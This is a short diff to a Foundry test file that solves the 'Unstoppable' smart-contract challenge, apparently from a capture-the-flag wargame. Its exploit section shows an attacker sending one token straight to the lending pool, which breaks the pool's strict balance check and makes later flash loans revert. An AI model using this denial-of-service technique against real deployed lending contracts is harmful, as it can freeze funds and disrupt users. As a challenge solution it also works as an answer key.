@@ -56,7 +56,11 @@ contract Unstoppable is Test {
 
     function testExploit() public {
         /** EXPLOIT START **/
+        vm.startPrank(attacker);
+        dvt.transfer(address(unstoppableLender), 1); // poolBalance only gets updated on calling depositTokens, so you just need to transfer to the lender to break the strict equality check that balanceBefore == poolBalance
+        vm.stopPrank();
         /** EXPLOIT END **/
+
         vm.expectRevert(UnstoppableLender.AssertionViolated.selector);
         validation();
     }
@@ -64,7 +68,7 @@ contract Unstoppable is Test {
     function validation() internal {
         // It is no longer possible to execute flash loans
         vm.startPrank(someUser);
-        receiverUnstoppable.executeFlashLoan(10);
+        receiverUnstoppable.executeFlashLoan(100);
         vm.stopPrank();
     }
 }
